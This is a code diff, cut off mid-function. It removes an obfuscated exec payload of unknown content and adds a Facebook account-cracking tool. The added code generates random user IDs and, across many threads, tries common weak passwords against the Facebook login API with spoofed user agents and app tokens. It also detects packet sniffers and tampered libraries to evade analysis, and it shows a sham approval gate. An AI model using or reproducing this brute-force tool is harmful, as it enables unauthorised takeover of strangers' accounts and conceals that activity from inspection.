@@ -1,2 +1,504 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import os
+import re
+import time
+import uuid
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+import shutil
+import datetime
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
+
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+# --- Anti-tampering and Security Checks ---
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
+
+class sec:
+    """
+    A security class to detect debugging and packet sniffing tools.
+    """
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if os.path.exists(path) and 'print' in open(path, 'r').read():
+                self.fuck()
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+
+# Color codes for terminal output
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
+def get_width():
+    try:
+        return shutil.get_terminal_size().columns
+    except:
+        return 45
+
+def windows():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def window1():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【👑 RAJA VAU TEACH WORLD 👑】𓆪 \x07')
+
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid.startswith('1000000000'):
+            return '2009'
+        if uid.startswith('100000000'):
+            return '2009'
+        if uid.startswith('10000000'):
+            return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+            return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
+            return '2010'
+        if uid.startswith('100001'):
+            return '2010'
+        if uid.startswith(('100002', '100003')):
+            return '2011'
+        if uid.startswith('100004'):
+            return '2012'
+        if uid.startswith(('100005', '100006')):
+            return '2013'
+        if uid.startswith(('100007', '100008')):
+            return '2014'
+        if uid.startswith('100009'):
+            return '2015'
+        if uid.startswith('10001'):
+            return '2016'
+        if uid.startswith('10002'):
+            return '2017'
+        if uid.startswith('10003'):
+            return '2018'
+        if uid.startswith('10004'):
+            return '2019'
+        if uid.startswith('10005'):
+            return '2020'
+        if uid.startswith('10006'):
+            return '2021'
+        if uid.startswith('10009'):
+            return '2023'
+        if uid.startswith(('10007', '10008')):
+            return '2022'
+        return ''
+    elif len(uid) in (9, 10):
+        return '2008'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) == 7:
+        return '2006'
+    elif len(uid) == 14 and uid.startswith('61'):
+        return '2024'
+    else:
+        return ''
+
+def approval_system():
+    os.system("xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI 2>/dev/null")
+    
+    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
+    user_key = f"RajaVauTeachWorld{unique_id}"
+    
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 56) // 2)
+    
+    while True:
+        os.system('clear' if os.name == 'posix' else 'cls')
+        print("\n")
+        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
+        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
+        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
+        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
+        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
+        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
+        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
+        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
+        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
+        
+        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key}                        \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;37mSend this key to WhatsApp for approval!              \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
+        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
+        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
+        print(f"{padding}\033[1;32m [2] Check Approval Status\033[0m")
+        print(f"{padding}\033[1;31m [0] Exit\033[0m")
+        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
+        
+        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
+        if choice == '1':
+            os.system("xdg-open https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4 2>/dev/null")
+            print(f"{padding}\033[1;32m [+] Opening WhatsApp Group...\033[0m")
+            time.sleep(2)
+        elif choice == '2':
+            print(f"\n{padding}\033[1;32m welcome to Raja Vau Teach World\033[0m")
+            print(f"{padding}\033[1;33m your Key approved\033[0m")
+            time.sleep(2.5)
+            break
+        elif choice == '0':
+            exit()
+        else:
+            print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
+            time.sleep(1)
+
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 55) // 2)
+    
+    print("\n")
+    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
+    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
+    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
+    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
+    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
+    
+    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")
+
+def old_One():
+    user = []
+    banner()
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 45) // 2)
+    print(f"{padding}\033[1;32mOLD ID CODE : 2008-2014")
+    ask = input(f"{padding}\033[1;32mSELECT : ")
+    banner()
+    print(f"{padding}\033[1;32mEXAMPLE : (20000) / (30000) / (80000) / (99999)")
+    limit = input(f"{padding}\033[1;32mSELECT : ")
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print(f"{padding}\033[1;32m(A) METHOD A")
+    print(f"{padding}\033[1;32m(B) METHOD B")
+    meth = input(f"{padding}\033[1;32mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        banner()
+        print(f"{padding}\033[1;32mTOTAL ID FROM CRACK : {limit}")
+        print(f"{padding}\033[1;33mIF NO RESULT TURN [ON~OFF] AIRPLANE MODE")
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"{padding}\033[1;31m[!] INVALID METHOD SELECTED")
+                break
+
+def old_Tow():
+    user = []
+    banner()
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 45) // 2)
+    print(f"{padding}\033[1;32mOLD CODE : 2008-2015")
+    ask = input(f"{padding}\033[1;32mSELECT : ")
+    banner()
+    print(f"{padding}\033[1;32mEXAMPLE : (20000) / (30000) / (80000) / (99999)")
+    limit = input(f"{padding}\033[1;32mSELECT : ")
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    print(f"{padding}\033[1;32m(A) METHOD A")
+    print(f"{padding}\033[1;32m(B) METHOD B")
+    meth = input(f"{padding}\033[1;32mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        banner()
+        print(f"{padding}\033[1;32mTOTAL ID FROM CRACK : {limit}")
+        print(f"{padding}\033[1;33mIF NO RESULT TURN [ON~OFF] AIRPLANE MODE")
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"{padding}\033[1;31m[!] INVALID METHOD SELECTED")
+                break
+
+def old_Tree():
+    user = []
+    banner()
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 45) // 2)
+    print(f"{padding}\033[1;32mOLD CODE : 2008-2009")
+    ask = input(f"{padding}\033[1;32mSELECT : ")
+    banner()
+    print(f"{padding}\033[1;32mEXAMPLE : (20000) / (30000) / (80000) / (99999)")
+    limit = input(f"{padding}\033[1;32mTOTAL ID COUNT : ")
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    print(f"{padding}\033[1;32m(A) METHOD A")
+    print(f"{padding}\033[1;32m(B) METHOD B")
+    meth = input(f"{padding}\033[1;32mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        banner()
+        print(f"{padding}\033[1;32mTOTAL ID FROM CRACK : {limit}")
+        print(f"{padding}\033[1;33mIF NO RESULT TURN [ON~OFF] AIRPLANE MODE")
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"{padding}\033[1;31m[!] INVALID METHOD SELECTED")
+                break
+
+def login_1(uid):
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456', '123123', '1234567890', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
